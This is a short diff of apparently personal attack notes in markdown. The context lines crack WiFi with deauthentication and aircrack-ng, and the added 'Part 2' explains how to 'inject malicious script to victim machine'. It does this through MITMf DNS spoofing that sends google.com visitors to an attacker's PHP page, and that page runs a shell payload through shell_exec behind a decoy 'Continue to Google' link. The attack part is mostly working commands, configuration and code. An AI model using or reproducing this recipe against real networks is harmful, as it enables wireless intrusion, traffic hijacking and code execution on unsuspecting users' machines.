@@ -27,4 +27,18 @@ aireplay --deauth 0 -a BSSID -c MAC wlan0
 aircrack-ng output-01.cap -w wl.txt
 ```
 ## Part 2. Injecting malicious script to victim machine.
+The general idea is to use MITM attack and do DNS spoofing. When the victim visites google.com, I will redirect him to php file under my server and execute the payload
+1. Install MITMf
+2. Change the /etc/mitmf/mitmf.conf file, add the following line below the IPv4 address record line
+```
+*.google.com=LOCALHOST_IP_IN_THE_TARGET_NETWORK/PATH_TO_PHP.php
+```
+3. Create the php file, Code I used is 
+```
+<?php
+$result = shell_exec('/var/www/html/payload.sh');
+echo $result;
+?>
+<a href="https://www.google.com">Continue to Google</a>
+```
 
